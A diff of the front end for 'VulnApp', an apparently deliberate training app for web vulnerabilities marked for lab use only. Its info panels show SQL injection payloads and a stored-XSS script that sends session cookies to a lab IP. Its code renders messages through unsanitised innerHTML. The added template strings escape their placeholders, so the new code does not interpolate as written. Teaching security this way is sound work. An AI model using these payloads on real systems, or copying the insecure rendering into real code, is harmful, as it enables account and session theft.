@@ -1,18 +1,27 @@
 <!DOCTYPE html>
 <html lang="es">
+
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>VulnApp — Versión Vulnerable</title>
   <style>
     /* ── Reset y base ── */
-    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    *,
+    *::before,
+    *::after {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
     body {
       font-family: 'Segoe UI', sans-serif;
       background: #1a1a2e;
       color: #e0e0e0;
       min-height: 100vh;
     }
+
     /* ── Barra de estado vulnerable ── */
     #vuln-banner {
       background: #ff4444;
@@ -23,6 +32,7 @@
       font-weight: bold;
       letter-spacing: 1px;
     }
+
     /* ── Nav ── */
     nav {
       background: #16213e;
@@ -32,9 +42,22 @@
       padding: 12px 24px;
       border-bottom: 2px solid #e94560;
     }
-    nav .logo { color: #e94560; font-size: 22px; font-weight: 700; }
-    nav .logo span { color: #fff; }
-    nav .nav-links { display: flex; gap: 16px; }
+
+    nav .logo {
+      color: #e94560;
+      font-size: 22px;
+      font-weight: 700;
+    }
+
+    nav .logo span {
+      color: #fff;
+    }
+
+    nav .nav-links {
+      display: flex;
+      gap: 16px;
+    }
+
     nav .nav-links button {
       background: none;
       border: 1px solid #e94560;
@@ -45,13 +68,19 @@
       font-size: 14px;
       transition: all 0.2s;
     }
-    nav .nav-links button:hover { background: #e94560; color: #fff; }
+
+    nav .nav-links button:hover {
+      background: #e94560;
+      color: #fff;
+    }
+
     /* ── Contenido ── */
     main {
       max-width: 900px;
       margin: 40px auto;
       padding: 0 20px;
     }
+
     /* ── Secciones ── */
     .section {
       background: #16213e;
@@ -61,12 +90,34 @@
       border: 1px solid #0f3460;
       display: none;
     }
-    .section.active { display: block; }
-    h2 { color: #e94560; margin-bottom: 20px; font-size: 20px; }
+
+    .section.active {
+      display: block;
+    }
+
+    h2 {
+      color: #e94560;
+      margin-bottom: 20px;
+      font-size: 20px;
+    }
+
     /* ── Formularios ── */
-    .form-group { margin-bottom: 16px; }
-    label { display: block; margin-bottom: 6px; font-size: 13px; color: #aaa; }
-    input[type="text"], input[type="password"], input[type="email"], textarea, select {
+    .form-group {
+      margin-bottom: 16px;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 6px;
+      font-size: 13px;
+      color: #aaa;
+    }
+
+    input[type="text"],
+    input[type="password"],
+    input[type="email"],
+    textarea,
+    select {
       width: 100%;
       padding: 10px 14px;
       background: #0f3460;
@@ -77,8 +128,17 @@
       outline: none;
       transition: border-color 0.2s;
     }
-    input:focus, textarea:focus { border-color: #e94560; }
-    textarea { resize: vertical; min-height: 80px; }
+
+    input:focus,
+    textarea:focus {
+      border-color: #e94560;
+    }
+
+    textarea {
+      resize: vertical;
+      min-height: 80px;
+    }
+
     .btn {
       padding: 10px 24px;
       border-radius: 6px;
@@ -88,9 +148,22 @@
       font-weight: 600;
       transition: opacity 0.2s;
     }
-    .btn:hover { opacity: 0.85; }
-    .btn-primary { background: #e94560; color: #fff; }
-    .btn-secondary { background: #0f3460; color: #e94560; border: 1px solid #e94560; }
+
+    .btn:hover {
+      opacity: 0.85;
+    }
+
+    .btn-primary {
+      background: #e94560;
+      color: #fff;
+    }
+
+    .btn-secondary {
+      background: #0f3460;
+      color: #e94560;
+      border: 1px solid #e94560;
+    }
+
     /* ── Alertas ── */
     .alert {
       padding: 10px 16px;
@@ -98,14 +171,50 @@
       margin-top: 14px;
       font-size: 13px;
     }
-    .alert-success { background: #1a3a2e; border: 1px solid #2ecc71; color: #2ecc71; }
-    .alert-error   { background: #3a1a1a; border: 1px solid #e74c3c; color: #e74c3c; }
-    .alert-info    { background: #1a2a3a; border: 1px solid #3498db; color: #3498db; }
+
+    .alert-success {
+      background: #1a3a2e;
+      border: 1px solid #2ecc71;
+      color: #2ecc71;
+    }
+
+    .alert-error {
+      background: #3a1a1a;
+      border: 1px solid #e74c3c;
+      color: #e74c3c;
+    }
+
+    .alert-info {
+      background: #1a2a3a;
+      border: 1px solid #3498db;
+      color: #3498db;
+    }
+
     /* ── Tabla de usuarios ── */
-    table { width: 100%; border-collapse: collapse; margin-top: 16px; font-size: 13px; }
-    th { background: #0f3460; color: #e94560; padding: 10px; text-align: left; }
-    td { padding: 8px 10px; border-bottom: 1px solid #1a4a80; word-break: break-all; }
-    tr:hover td { background: #0a2040; }
+    table {
+      width: 100%;
+      border-collapse: collapse;
+      margin-top: 16px;
+      font-size: 13px;
+    }
+
+    th {
+      background: #0f3460;
+      color: #e94560;
+      padding: 10px;
+      text-align: left;
+    }
+
+    td {
+      padding: 8px 10px;
+      border-bottom: 1px solid #1a4a80;
+      word-break: break-all;
+    }
+
+    tr:hover td {
+      background: #0a2040;
+    }
+
     /* ── Mensajes ── */
     .msg-item {
       background: #0f3460;
@@ -114,17 +223,42 @@
       margin-bottom: 12px;
       border-left: 3px solid #e94560;
     }
-    .msg-item .msg-sender { font-size: 12px; color: #aaa; margin-bottom: 6px; }
-    /* FALLA CWE-116: el contenido se renderiza con innerHTML sin sanitizar */
-    .msg-item .msg-content { font-size: 14px; }
-    /* ── Tabs ── */
-    .tabs { display: flex; gap: 8px; margin-bottom: 20px; }
-    .tab-btn {
-      padding: 8px 20px; border-radius: 6px 6px 0 0;
-      border: 1px solid #0f3460; border-bottom: none;
-      background: #0a1628; color: #aaa; cursor: pointer; font-size: 13px;
+
+    .msg-item .msg-sender {
+      font-size: 12px;
+      color: #aaa;
+      margin-bottom: 6px;
     }
-    .tab-btn.active { background: #16213e; color: #e94560; border-color: #e94560; }
+
+    /* FALLA CWE-116: el contenido se renderiza con innerHTML sin sanitizar */
+    .msg-item .msg-content {
+      font-size: 14px;
+    }
+
+    /* ── Tabs ── */
+    .tabs {
+      display: flex;
+      gap: 8px;
+      margin-bottom: 20px;
+    }
+
+    .tab-btn {
+      padding: 8px 20px;
+      border-radius: 6px 6px 0 0;
+      border: 1px solid #0f3460;
+      border-bottom: none;
+      background: #0a1628;
+      color: #aaa;
+      cursor: pointer;
+      font-size: 13px;
+    }
+
+    .tab-btn.active {
+      background: #16213e;
+      color: #e94560;
+      border-color: #e94560;
+    }
+
     /* ── Badge de rol ── */
     .role-badge {
       display: inline-block;
@@ -134,8 +268,17 @@
       font-weight: 700;
       text-transform: uppercase;
     }
-    .role-badge.admin { background: #e94560; color: #fff; }
-    .role-badge.user  { background: #0f3460; color: #3498db; }
+
+    .role-badge.admin {
+      background: #e94560;
+      color: #fff;
+    }
+
+    .role-badge.user {
+      background: #0f3460;
+      color: #3498db;
+    }
+
     /* ── Info panel ── */
     .info-panel {
       background: #0a1628;
@@ -147,387 +290,354 @@
       color: #aaa;
       font-family: monospace;
     }
-    .info-panel strong { color: #e94560; }
+
+    .info-panel strong {
+      color: #e94560;
+    }
   </style>
 </head>
+
 <body>
 
-<div id="vuln-banner">⚠ VERSIÓN VULNERABLE — SOLO PARA USO EN LABORATORIO CONTROLADO ⚠</div>
+  <div id="vuln-banner">⚠ VERSIÓN VULNERABLE — SOLO PARA USO EN LABORATORIO CONTROLADO ⚠</div>
 
-<nav>
-  <div class="logo">Vuln<span>App</span></div>
-  <div class="nav-links" id="nav-links">
-    <button onclick="showSection('login')">Login</button>
-    <button onclick="showSection('register')">Registrar</button>
-  </div>
-</nav>
+  <nav>
+    <div class="logo">Vuln<span>App</span></div>
+    <div class="nav-links" id="nav-links">
+      <button onclick="showSection('login')">Login</button>
+      <button onclick="showSection('register')">Registrar</button>
+    </div>
+  </nav>
 
-<main>
+  <main>
 
-  <!-- ── SECCIÓN: LOGIN ── -->
-  <section class="section active" id="section-login">
-    <h2>🔐 Iniciar Sesión</h2>
-    <div class="info-panel">
-      <strong>Falla activa:</strong> CWE-89 (SQL Injection) + CWE-345/311 (Cookie Base64 sin firma)<br>
-      <strong>Endpoint:</strong> POST /api/login<br>
-      <strong>Payload SQLi de ejemplo:</strong> username = <code>' OR '1'='1'--</code>
-    </div>
-    <div class="form-group">
-      <label for="login-username">Usuario</label>
-      <input type="text" id="login-username" placeholder="admin" />
-    </div>
-    <div class="form-group">
-      <label for="login-password">Contraseña</label>
-      <input type="password" id="login-password" placeholder="••••••••" />
-    </div>
-    <button class="btn btn-primary" id="btn-login" onclick="doLogin()">Entrar</button>
-    <div id="login-result"></div>
-  </section>
-
-  <!-- ── SECCIÓN: REGISTER ── -->
-  <section class="section" id="section-register">
-    <h2>📝 Registrar Usuario</h2>
-    <div class="info-panel">
-      <strong>Falla activa:</strong> CWE-327/759/916 (MD5 sin salt)<br>
-      <strong>Endpoint:</strong> POST /api/register
-    </div>
-    <div class="form-group">
-      <label for="reg-username">Usuario</label>
-      <input type="text" id="reg-username" placeholder="nuevo_usuario" />
-    </div>
-    <div class="form-group">
-      <label for="reg-password">Contraseña</label>
-      <input type="password" id="reg-password" placeholder="••••••••" />
-    </div>
-    <div class="form-group">
-      <label for="reg-email">Email</label>
-      <input type="email" id="reg-email" placeholder="usuario@ejemplo.com" />
-    </div>
-    <button class="btn btn-primary" onclick="doRegister()">Registrar</button>
-    <div id="register-result"></div>
-  </section>
-
-  <!-- ── SECCIÓN: DASHBOARD (autenticado) ── -->
-  <section class="section" id="section-dashboard">
-    <h2>🏠 Panel de Usuario</h2>
-    <div id="profile-info"></div>
-
-    <!-- TABS -->
-    <div class="tabs">
-      <button class="tab-btn active" id="tab-search" onclick="switchTab('search')">🔍 Buscar</button>
-      <button class="tab-btn" id="tab-messages" onclick="switchTab('messages')">✉ Mensajes</button>
-      <button class="tab-btn" id="tab-send" onclick="switchTab('send')">📤 Enviar</button>
-      <button class="tab-btn" id="tab-admin" onclick="switchTab('admin')" style="display:none">👑 Admin</button>
-    </div>
-
-    <!-- Tab: Búsqueda de usuarios -->
-    <div id="tab-content-search">
+    <!-- ── SECCIÓN: LOGIN ── -->
+    <section class="section active" id="section-login">
+      <h2>🔐 Iniciar Sesión</h2>
       <div class="info-panel">
-        <strong>Falla activa:</strong> CWE-89 SQL Injection (UNION-Based)<br>
-        <strong>Endpoint:</strong> POST /api/search<br>
-        <strong>Payload:</strong> <code>' UNION SELECT username,password,email FROM users--</code>
+        <strong>Falla activa:</strong> CWE-89 (SQL Injection) + CWE-345/311 (Cookie Base64 sin firma)<br>
+        <strong>Endpoint:</strong> POST /api/login<br>
+        <strong>Payload SQLi de ejemplo:</strong> username = <code>' OR '1'='1'--</code>
       </div>
       <div class="form-group">
-        <label for="search-query">Buscar usuario</label>
-        <input type="text" id="search-query" placeholder="nombre de usuario..." />
-      </div>
-      <button class="btn btn-primary" onclick="doSearch()">Buscar</button>
-      <div id="search-results"></div>
-    </div>
-
-    <!-- Tab: Mensajes recibidos -->
-    <div id="tab-content-messages" style="display:none">
-      <div class="info-panel">
-        <strong>Falla activa:</strong> CWE-79 (Stored XSS) + CWE-116 (innerHTML inseguro)<br>
-        <strong>Endpoint:</strong> GET /api/messages<br>
-        <strong>Los mensajes se renderizan con innerHTML sin sanitizar.</strong>
-      </div>
-      <button class="btn btn-secondary" onclick="loadMessages()" style="margin-bottom:16px">🔄 Actualizar</button>
-      <div id="messages-container"></div>
-    </div>
-
-    <!-- Tab: Enviar mensaje -->
-    <div id="tab-content-send" style="display:none">
-      <div class="info-panel">
-        <strong>Falla activa:</strong> CWE-79 (Stored XSS) — contenido almacenado sin sanitizar<br>
-        <strong>Endpoint:</strong> POST /api/message<br>
-        <strong>Payload Worm:</strong> <code>&lt;script&gt;fetch('http://192.168.56.10:8888/?c='+document.cookie)&lt;/script&gt;</code>
+        <label for="login-username">Usuario</label>
+        <input type="text" id="login-username" placeholder="admin" />
       </div>
       <div class="form-group">
-        <label for="msg-to">ID del destinatario</label>
-        <input type="text" id="msg-to" placeholder="1" />
+        <label for="login-password">Contraseña</label>
+        <input type="password" id="login-password" placeholder="••••••••" />
+      </div>
+      <button class="btn btn-primary" id="btn-login" onclick="doLogin()">Entrar</button>
+      <div id="login-result"></div>
+    </section>
+
+    <!-- ── SECCIÓN: REGISTER ── -->
+    <section class="section" id="section-register">
+      <h2>📝 Registrar Usuario</h2>
+      <div class="info-panel">
+        <strong>Falla activa:</strong> CWE-327/759/916 (MD5 sin salt)<br>
+        <strong>Endpoint:</strong> POST /api/register
       </div>
       <div class="form-group">
-        <label for="msg-content">Mensaje</label>
-        <textarea id="msg-content" placeholder="Escribe tu mensaje aquí..."></textarea>
+        <label for="reg-username">Usuario</label>
+        <input type="text" id="reg-username" placeholder="nuevo_usuario" />
       </div>
-      <button class="btn btn-primary" onclick="sendMessage()">Enviar</button>
-      <div id="send-result"></div>
-    </div>
-
-    <!-- Tab: Panel Admin -->
-    <div id="tab-content-admin" style="display:none">
-      <div class="info-panel">
-        <strong>Falla activa:</strong> CWE-345/311 — Cookie Base64 adulterada otorga acceso admin<br>
-        <strong>Endpoint:</strong> GET /api/profile (con role=admin en cookie)<br>
-        <strong>Todos los hashes MD5 de contraseñas expuestos abajo.</strong>
+      <div class="form-group">
+        <label for="reg-password">Contraseña</label>
+        <input type="password" id="reg-password" placeholder="••••••••" />
       </div>
-      <h3 style="color:#e94560;margin-bottom:16px">Todos los Usuarios (Vista Administrativa)</h3>
-      <div id="admin-users"></div>
-    </div>
+      <div class="form-group">
+        <label for="reg-email">Email</label>
+        <input type="email" id="reg-email" placeholder="usuario@ejemplo.com" />
+      </div>
+      <button class="btn btn-primary" onclick="doRegister()">Registrar</button>
+      <div id="register-result"></div>
+    </section>
 
-    <button class="btn btn-secondary" onclick="doLogout()" style="margin-top:20px">Cerrar Sesión</button>
-  </section>
+    <!-- ── SECCIÓN: DASHBOARD (autenticado) ── -->
+    <section class="section" id="section-dashboard">
+      <h2>🏠 Panel de Usuario</h2>
+      <div id="profile-info"></div>
 
-</main>
+      <!-- TABS -->
+      <div class="tabs">
+        <button class="tab-btn active" id="tab-search" onclick="switchTab('search')">🔍 Buscar</button>
+        <button class="tab-btn" id="tab-messages" onclick="switchTab('messages')">✉ Mensajes</button>
+        <button class="tab-btn" id="tab-send" onclick="switchTab('send')">📤 Enviar</button>
+      </div>
 
-<script>
-// ═══════════════════════════════════════════════════════════════
-// VulnApp Frontend — DELIBERADAMENTE INSEGURO
-// Fallas implementadas:
-//   • CWE-79:  innerHTML para renderizar mensajes (permite XSS)
-//   • CWE-116: Sin sanitización de salida
-//   • CWE-345: Cookie Base64 manipulable sin verificación
-// ═══════════════════════════════════════════════════════════════
+      <!-- Tab: Búsqueda de usuarios -->
+      <div id="tab-content-search">
+        <div class="info-panel">
+          <strong>Falla activa:</strong> CWE-89 SQL Injection (UNION-Based)<br>
+          <strong>Endpoint:</strong> POST /api/search<br>
+          <strong>Payload:</strong> <code>' UNION SELECT username,password,email FROM users--</code>
+        </div>
+        <div class="form-group">
+          <label for="search-query">Buscar usuario</label>
+          <input type="text" id="search-query" placeholder="nombre de usuario..." />
+        </div>
+        <button class="btn btn-primary" onclick="doSearch()">Buscar</button>
+        <div id="search-results"></div>
+      </div>
 
-let currentUser = null;
+      <!-- Tab: Mensajes recibidos -->
+      <div id="tab-content-messages" style="display:none">
+        <div class="info-panel">
+          <strong>Falla activa:</strong> CWE-79 (Stored XSS) + CWE-116 (innerHTML inseguro)<br>
+          <strong>Endpoint:</strong> GET /api/messages<br>
+          <strong>Los mensajes se renderizan con innerHTML sin sanitizar.</strong>
+        </div>
+        <button class="btn btn-secondary" onclick="loadMessages()" style="margin-bottom:16px">🔄 Actualizar</button>
+        <div id="messages-container"></div>
+      </div>
 
-function showSection(name) {
-  document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
-  document.getElementById('section-' + name).classList.add('active');
-}
+      <!-- Tab: Enviar mensaje -->
+      <div id="tab-content-send" style="display:none">
+        <div class="info-panel">
+          <strong>Falla activa:</strong> CWE-79 (Stored XSS) — contenido almacenado sin sanitizar<br>
+          <strong>Endpoint:</strong> POST /api/message<br>
+          <strong>Payload Worm:</strong>
+          <code>&lt;script&gt;fetch('http://192.168.56.10:8888/?c='+document.cookie)&lt;/script&gt;</code>
+        </div>
+        <div class="form-group">
+          <label for="msg-to">ID del destinatario</label>
+          <input type="text" id="msg-to" placeholder="1" />
+        </div>
+        <div class="form-group">
+          <label for="msg-content">Mensaje</label>
+          <textarea id="msg-content" placeholder="Escribe tu mensaje aquí..."></textarea>
+        </div>
+        <button class="btn btn-primary" onclick="sendMessage()">Enviar</button>
+        <div id="send-result"></div>
+      </div>
 
-function switchTab(name) {
-  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
-  document.getElementById('tab-' + name).classList.add('active');
-  ['search','messages','send','admin'].forEach(t => {
-    const el = document.getElementById('tab-content-' + t);
-    if (el) el.style.display = (t === name) ? 'block' : 'none';
-  });
-  if (name === 'messages') loadMessages();
-  if (name === 'admin')    loadAdminPanel();
-}
 
-function setAlert(containerId, message, type) {
-  document.getElementById(containerId).innerHTML =
-    `<div class="alert alert-${type}">${message}</div>`;
-}
 
-// ── Login ─────────────────────────────────────────────────────
-async function doLogin() {
-  const username = document.getElementById('login-username').value;
-  const password = document.getElementById('login-password').value;
-  try {
-    const res = await fetch('/api/login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username, password }),
-      credentials: 'include'
-    });
-    const data = await res.json();
-    if (res.ok) {
-      currentUser = data;
-      setAlert('login-result', `✅ Bienvenido. Rol: <strong>${data.role}</strong>`, 'success');
-      setTimeout(() => loadDashboard(), 800);
-    } else {
-      setAlert('login-result', `❌ ${data.error}`, 'error');
+      <button class="btn btn-secondary" onclick="doLogout()" style="margin-top:20px">Cerrar Sesión</button>
+    </section>
+
+  </main>
+
+  <script>
+    // ═══════════════════════════════════════════════════════════════
+    // VulnApp Frontend — DELIBERADAMENTE INSEGURO
+    // Fallas implementadas:
+    //   • CWE-79:  innerHTML para renderizar mensajes (permite XSS)
+    //   • CWE-116: Sin sanitización de salida
+    //   • CWE-345: Cookie Base64 manipulable sin verificación
+    // ═══════════════════════════════════════════════════════════════
+
+    let currentUser = null;
+
+    function showSection(name) {
+      document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+      document.getElementById('section-' + name).classList.add('active');
     }
-  } catch (e) {
-    setAlert('login-result', `Error de red: ${e.message}`, 'error');
-  }
-}
 
-// ── Register ──────────────────────────────────────────────────
-async function doRegister() {
-  const username = document.getElementById('reg-username').value;
-  const password = document.getElementById('reg-password').value;
-  const email    = document.getElementById('reg-email').value;
-  try {
-    const res = await fetch('/api/register', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username, password, email })
-    });
-    const data = await res.json();
-    if (res.ok) {
-      setAlert('register-result', '✅ ' + data.message, 'success');
-    } else {
-      setAlert('register-result', '❌ ' + data.error, 'error');
+    function switchTab(name) {
+      document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+      document.getElementById('tab-' + name).classList.add('active');
+      ['search', 'messages', 'send'].forEach(t => {
+        const el = document.getElementById('tab-content-' + t);
+        if (el) el.style.display = (t === name) ? 'block' : 'none';
+      });
+      if (name === 'messages') loadMessages();
     }
-  } catch (e) {
-    setAlert('register-result', 'Error: ' + e.message, 'error');
-  }
-}
 
-// ── Dashboard ─────────────────────────────────────────────────
-async function loadDashboard() {
-  try {
-    const res  = await fetch('/api/profile', { credentials: 'include' });
-    const data = await res.json();
-    if (!res.ok) { showSection('login'); return; }
+    function setAlert(containerId, message, type) {
+      document.getElementById(containerId).innerHTML =
+        `<div class="alert alert-${type}">\${message}</div>`;
+    }
 
-    const isAdmin = data.admin === true;
-    currentUser   = data.user || { role: isAdmin ? 'admin' : 'user' };
+    // ── Login ─────────────────────────────────────────────────────
+    async function doLogin() {
+      const username = document.getElementById('login-username').value;
+      const password = document.getElementById('login-password').value;
+      try {
+        const res = await fetch('/api/login', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username, password }),
+          credentials: 'include'
+        });
+        const data = await res.json();
+        if (res.ok) {
+          currentUser = data;
+          setAlert('login-result', `✅ Bienvenido. Rol: <strong>\${data.role}</strong>`, 'success');
+          setTimeout(() => loadDashboard(), 800);
+        } else {
+          setAlert('login-result', `❌ \${data.error}`, 'error');
+        }
+      } catch (e) {
+        setAlert('login-result', `Error de red: \${e.message}`, 'error');
+      }
+    }
 
-    // Mostrar info de sesión + cookie actual
-    const cookieRaw = document.cookie.match(/session=([^;]+)/);
-    const cookieVal = cookieRaw ? cookieRaw[1] : '(no disponible desde JS — HttpOnly podría estar activo)';
-    let decoded = '';
-    try { decoded = atob(cookieVal); } catch { decoded = 'N/A'; }
+    // ── Register ──────────────────────────────────────────────────
+    async function doRegister() {
+      const username = document.getElementById('reg-username').value;
+      const password = document.getElementById('reg-password').value;
+      const email = document.getElementById('reg-email').value;
+      try {
+        const res = await fetch('/api/register', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ username, password, email })
+        });
+        const data = await res.json();
+        if (res.ok) {
+          setAlert('register-result', '✅ ' + data.message, 'success');
+        } else {
+          setAlert('register-result', '❌ ' + data.error, 'error');
+        }
+      } catch (e) {
+        setAlert('register-result', 'Error: ' + e.message, 'error');
+      }
+    }
 
-    document.getElementById('profile-info').innerHTML = `
+    // ── Dashboard ─────────────────────────────────────────────────
+    async function loadDashboard() {
+      try {
+        const res = await fetch('/api/profile', { credentials: 'include' });
+        const data = await res.json();
+        if (!res.ok) { showSection('login'); return; }
+
+        currentUser = data.user || { role: 'user' };
+
+        // Mostrar info de sesión + cookie actual
+        const cookieRaw = document.cookie.match(/session=([^;]+)/);
+        const cookieVal = cookieRaw ? cookieRaw[1] : '(no disponible desde JS — HttpOnly podría estar activo)';
+        let decoded = '';
+        try { decoded = atob(cookieVal); } catch { decoded = 'N/A'; }
+
+        document.getElementById('profile-info').innerHTML = `
       <div class="info-panel" style="margin-bottom:20px">
-        <strong>Sesión activa:</strong> ${currentUser.username || 'admin'}&nbsp;
-        <span class="role-badge ${isAdmin ? 'admin' : 'user'}">${isAdmin ? 'admin' : currentUser.role}</span><br>
-        <strong>Cookie (Base64):</strong> <code style="font-size:11px;word-break:break-all">${cookieVal}</code><br>
-        <strong>Cookie decodificada:</strong> <code style="color:#e94560">${decoded}</code>
+        <strong>Sesión activa:</strong> \${currentUser.username || 'N/A'}&nbsp;
+        <span class="role-badge \${currentUser.role}">\${currentUser.role}</span><br>
+        <strong>Cookie (Base64):</strong> <code style="font-size:11px;word-break:break-all">\${cookieVal}</code><br>
+        <strong>Cookie decodificada:</strong> <code style="color:#e94560">\${decoded}</code>
       </div>
     `;
 
-    // Mostrar tab Admin si corresponde
-    if (isAdmin) {
-      document.getElementById('tab-admin').style.display = 'inline-block';
+        showSection('dashboard');
+      } catch (e) {
+        showSection('login');
+      }
     }
 
-    showSection('dashboard');
-  } catch (e) {
-    showSection('login');
-  }
-}
-
-// ── Búsqueda (SQLi vulnerable) ────────────────────────────────
-async function doSearch() {
-  const q = document.getElementById('search-query').value;
-  try {
-    const res  = await fetch('/api/search', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ query: q }),
-      credentials: 'include'
-    });
-    const data = await res.json();
-    const container = document.getElementById('search-results');
-    if (!res.ok) {
-      container.innerHTML = `<div class="alert alert-error">Error: ${data.error}</div>`;
-      return;
+    // ── Búsqueda (SQLi vulnerable) ────────────────────────────────
+    async function doSearch() {
+      const q = document.getElementById('search-query').value;
+      try {
+        const res = await fetch('/api/search', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ query: q }),
+          credentials: 'include'
+        });
+        const data = await res.json();
+        const container = document.getElementById('search-results');
+        if (!res.ok) {
+          container.innerHTML = `<div class="alert alert-error">Error: \${data.error}</div>`;
+          return;
+        }
+        if (!data.results || data.results.length === 0) {
+          container.innerHTML = '<div class="alert alert-info">Sin resultados</div>';
+          return;
+        }
+        let html = '<table><tr><th>#</th><th>Usuario</th><th>Email</th></tr>';
+        for (const u of data.results) {
+          // Nota: se usan las columnas que devuelva la query (incluso si el atacante
+          // las sobreescribió con UNION SELECT username,password,email FROM users)
+          html += `<tr><td>\${u.id ?? '—'}</td><td>\${u.username}</td><td>\${u.email}</td></tr>`;
+        }
+        html += '</table>';
+        container.innerHTML = html;
+      } catch (e) {
+        document.getElementById('search-results').innerHTML =
+          `<div class="alert alert-error">Error: \${e.message}</div>`;
+      }
     }
-    if (!data.results || data.results.length === 0) {
-      container.innerHTML = '<div class="alert alert-info">Sin resultados</div>';
-      return;
-    }
-    let html = '<table><tr><th>#</th><th>Usuario</th><th>Email</th></tr>';
-    for (const u of data.results) {
-      // Nota: se usan las columnas que devuelva la query (incluso si el atacante
-      // las sobreescribió con UNION SELECT username,password,email FROM users)
-      html += `<tr><td>${u.id ?? '—'}</td><td>${u.username}</td><td>${u.email}</td></tr>`;
-    }
-    html += '</table>';
-    container.innerHTML = html;
-  } catch (e) {
-    document.getElementById('search-results').innerHTML =
-      `<div class="alert alert-error">Error: ${e.message}</div>`;
-  }
-}
 
-// ── Mensajes (Stored XSS vulnerable) ─────────────────────────
-async function loadMessages() {
-  try {
-    const res  = await fetch('/api/messages', { credentials: 'include' });
-    const data = await res.json();
-    const container = document.getElementById('messages-container');
-    if (!res.ok) {
-      container.innerHTML = `<div class="alert alert-error">${data.error}</div>`;
-      return;
+    // ── Mensajes (Stored XSS vulnerable) ─────────────────────────
+    async function loadMessages() {
+      try {
+        const res = await fetch('/api/messages', { credentials: 'include' });
+        const data = await res.json();
+        const container = document.getElementById('messages-container');
+        if (!res.ok) {
+          container.innerHTML = `<div class="alert alert-error">\${data.error}</div>`;
+          return;
+        }
+        if (!data.messages || data.messages.length === 0) {
+          container.innerHTML = '<div class="alert alert-info">No tienes mensajes.</div>';
+          return;
+        }
+        container.innerHTML = '';
+        for (const msg of data.messages) {
+          const item = document.createElement('div');
+          item.className = 'msg-item';
+          item.innerHTML = `<div class="msg-sender">📨 De: \${msg.sender} · \${msg.created_at}</div>`;
+
+          const contentDiv = document.createElement('div');
+          contentDiv.className = 'msg-content';
+          // ╔══════════════════════════════════════════════════════╗
+          // ║  FALLA CWE-79 / CWE-116: innerHTML SIN sanitización  ║
+          // ║  El payload XSS se ejecuta aquí directamente.        ║
+          // ║  EXPLICACIÓN TÉCNICA DEL RIESGO: La propiedad        ║
+          // ║  innerHTML le indica al navegador que analice el     ║
+          // ║  contenido como código HTML/DOM en lugar de texto.   ║
+          // ║  Al asignar datos no confiables sin codificarlos     ║
+          // ║  previamente, etiquetas como <script> se ejecutan    ║
+          // ║  en la sesión de la víctima (XSS Almacenado).        ║
+          // ╚══════════════════════════════════════════════════════╝
+          contentDiv.innerHTML = msg.content;
+
+          item.appendChild(contentDiv);
+          container.appendChild(item);
+        }
+      } catch (e) {
+        document.getElementById('messages-container').innerHTML =
+          `<div class="alert alert-error">Error: \${e.message}</div>`;
+      }
     }
-    if (!data.messages || data.messages.length === 0) {
-      container.innerHTML = '<div class="alert alert-info">No tienes mensajes.</div>';
-      return;
+
+    // ── Enviar Mensaje ────────────────────────────────────────────
+    async function sendMessage() {
+      const receiverId = document.getElementById('msg-to').value;
+      const content = document.getElementById('msg-content').value;
+      try {
+        const res = await fetch('/api/message', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ receiverId, content }),
+          credentials: 'include'
+        });
+        const data = await res.json();
+        setAlert('send-result', res.ok ? '✅ ' + data.message : '❌ ' + data.error,
+          res.ok ? 'success' : 'error');
+      } catch (e) {
+        setAlert('send-result', 'Error: ' + e.message, 'error');
+      }
     }
-    container.innerHTML = '';
-    for (const msg of data.messages) {
-      const item = document.createElement('div');
-      item.className = 'msg-item';
-      item.innerHTML = `<div class="msg-sender">📨 De: ${msg.sender} · ${msg.created_at}</div>`;
 
-      const contentDiv = document.createElement('div');
-      contentDiv.className = 'msg-content';
-      // ╔══════════════════════════════════════════════════════╗
-      // ║  FALLA CWE-79 / CWE-116: innerHTML SIN sanitización  ║
-      // ║  El payload XSS se ejecuta aquí directamente.        ║
-      // ╚══════════════════════════════════════════════════════╝
-      contentDiv.innerHTML = msg.content;
 
-      item.appendChild(contentDiv);
-      container.appendChild(item);
+
+    // ── Logout ────────────────────────────────────────────────────
+    function doLogout() {
+      document.cookie = 'session=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';
+      currentUser = null;
+      showSection('login');
     }
-  } catch (e) {
-    document.getElementById('messages-container').innerHTML =
-      `<div class="alert alert-error">Error: ${e.message}</div>`;
-  }
-}
 
-// ── Enviar Mensaje ────────────────────────────────────────────
-async function sendMessage() {
-  const receiverId = document.getElementById('msg-to').value;
-  const content    = document.getElementById('msg-content').value;
-  try {
-    const res  = await fetch('/api/message', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ receiverId, content }),
-      credentials: 'include'
-    });
-    const data = await res.json();
-    setAlert('send-result', res.ok ? '✅ ' + data.message : '❌ ' + data.error,
-             res.ok ? 'success' : 'error');
-  } catch (e) {
-    setAlert('send-result', 'Error: ' + e.message, 'error');
-  }
-}
-
-// ── Panel Admin (cookie manipulada) ──────────────────────────
-async function loadAdminPanel() {
-  try {
-    const res  = await fetch('/api/profile', { credentials: 'include' });
-    const data = await res.json();
-    const container = document.getElementById('admin-users');
-    if (!data.admin) {
-      container.innerHTML = '<div class="alert alert-error">Acceso denegado.</div>';
-      return;
-    }
-    let html = `<table>
-      <tr><th>ID</th><th>Usuario</th><th>Hash MD5 (sin salt)</th><th>Rol</th><th>Email</th></tr>`;
-    for (const u of data.users) {
-      html += `<tr>
